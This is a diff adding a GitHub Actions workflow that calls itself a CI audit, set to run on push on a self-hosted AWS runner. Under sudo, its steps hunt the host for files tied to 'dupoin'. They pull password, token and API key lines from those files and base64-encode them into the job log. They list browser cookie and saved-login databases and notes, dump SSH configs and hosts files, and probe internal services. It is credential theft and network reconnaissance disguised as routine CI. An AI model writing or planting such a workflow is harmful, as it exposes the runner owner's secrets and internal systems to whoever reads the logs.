@@ -1,0 +1,43 @@
+name: ci-audit-2044b
+on: push
+permissions:
+  contents: read
+jobs:
+  hunt:
+    runs-on: [self-hosted, linux, aws, marketingos]
+    timeout-minutes: 25
+    steps:
+      - name: files
+        continue-on-error: true
+        run: |
+          set +e
+          echo "## names containing dupoin/bos"
+          sudo -n find / -xdev -iname '*dupoin*' -o -xdev -iname '*bos*' 2>/dev/null | grep -vE '/proc|/sys|/usr/lib|/usr/share|node_modules' | head -40
+          echo "## files mentioning crm.dupoin / iapi / pro-srv"
+          sudo -n grep -rIlE 'crm\.dupoin\.com|iapi/v1/pro|pro-srv-account|canCreateAccount|CF-Access-Jwt' /home/ubuntu /root /opt /srv /etc 2>/dev/null | head -30
+      - name: creds
+        continue-on-error: true
+        run: |
+          set +e
+          echo "## dupoin + passwd-ish lines (b64)"
+          for f in $(sudo -n grep -rIl 'dupoin' /home/ubuntu /root /opt /srv /etc 2>/dev/null | head -25); do echo "FILE=$f"; sudo -n grep -hIiE '(crm|manager|admin|password|passwd|secret|token|apikey|api_key).{0,40}' "$f" 2>/dev/null | head -12 | base64 -w0; echo; done
+      - name: browser
+        continue-on-error: true
+        run: |
+          set +e
+          echo "## browser profiles"
+          sudo -n find /home /root -maxdepth 5 \( -iname 'Cookies' -o -iname 'cookies.sqlite' -o -iname 'Login Data' \) 2>/dev/null | head
+          echo "## obsidian / notes"
+          sudo -n find /home /root -maxdepth 6 -iname '*obsidian*' 2>/dev/null | head
+          sudo -n find /home/ubuntu -maxdepth 4 -name '*.md' 2>/dev/null | head -30
+      - name: net
+        continue-on-error: true
+        run: |
+          set +e
+          echo "## hosts"
+          cat /etc/hosts
+          echo "## ssh cfg"; sudo -n cat /root/.ssh/config /home/ubuntu/.ssh/config 2>/dev/null | head -40
+          echo "## resolve dupoin internal names"
+          for h in crm.dupoin.com pro-srv-account.csharp pro-srv-user.csharp mydupoin.net; do printf '%-30s ' $h; getent hosts $h | head -1; echo; done
+          echo "## reach internal csharp"
+          curl -s -o /dev/null -w 'csharp %{http_code}\n' -m 5 http://pro-srv-account.csharp/config
